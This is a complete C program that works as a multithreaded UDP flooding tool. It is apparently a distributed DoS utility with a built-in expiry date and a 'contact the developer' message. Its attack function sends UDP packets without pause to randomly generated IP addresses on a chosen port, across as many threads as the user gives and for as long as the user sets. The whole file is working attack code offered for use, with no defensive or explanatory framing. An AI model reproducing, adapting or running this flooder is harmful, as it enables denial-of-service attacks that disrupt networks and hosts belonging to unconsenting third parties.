#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

// Expiration date: 25 January 2025
#define EXPIRATION_YEAR 2025
#define EXPIRATION_MONTH 1
#define EXPIRATION_DAY 25

// Function to generate a random IP address
void generate_random_ip(char *ip_buffer) {
    sprintf(ip_buffer, "%d.%d.%d.%d", rand() % 256, rand() % 256, rand() % 256, rand() % 256);
}

void usage() {
    printf("EXAMPLE: ./program_name <port> <duration> <threads>\n");
    exit(1);
}

// Check if the current date is past the expiration date
int is_expired() {
    time_t now = time(NULL);
    struct tm expiration_tm = {0};

    expiration_tm.tm_year = EXPIRATION_YEAR - 1900; // Year since 1900
    expiration_tm.tm_mon = EXPIRATION_MONTH - 1;   // Month (0-11)
    expiration_tm.tm_mday = EXPIRATION_DAY;

    time_t expiration_time = mktime(&expiration_tm);

    if (expiration_time == -1) {
        perror("Error setting expiration time");
        exit(1);
    }

    return now > expiration_time; // Returns 1 if expired, 0 otherwise
}

struct thread_data {
    char ip[16];
    int port;
    int duration;
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->duration;

    printf("Thread started: Targeting IP %s\n", data->ip);

    while (time(NULL) <= endtime) {
        if (sendto(sock, "test", strlen("test"), 0, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
            close(sock);
            pthread_exit(NULL);
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        usage();
    }

    // Check expiration date
    if (is_expired()) {
        printf("The program has expired. Please update or contact the developer.\n");
        return 0;
    }

    int port = atoi(argv[1]);
    int duration = atoi(argv[2]);
    int threads = atoi(argv[3]);

    srand(time(NULL)); // Seed the random number generator

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data *data = malloc(threads * sizeof(struct thread_data));

    printf("Flood started on port %d for %d seconds with %d threads\n", port, duration, threads);

    for (int i = 0; i < threads; i++) {
        generate_random_ip(data[i].ip); // Generate a new random IP address
        data[i].port = port;
        data[i].duration = duration;

        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data[i]) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            free(data);
            exit(1);
        }

        printf("Launched thread %d with IP: %s\n", i + 1, data[i].ip);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    free(data);

    printf("Attack finished\n");
    return 0;
}
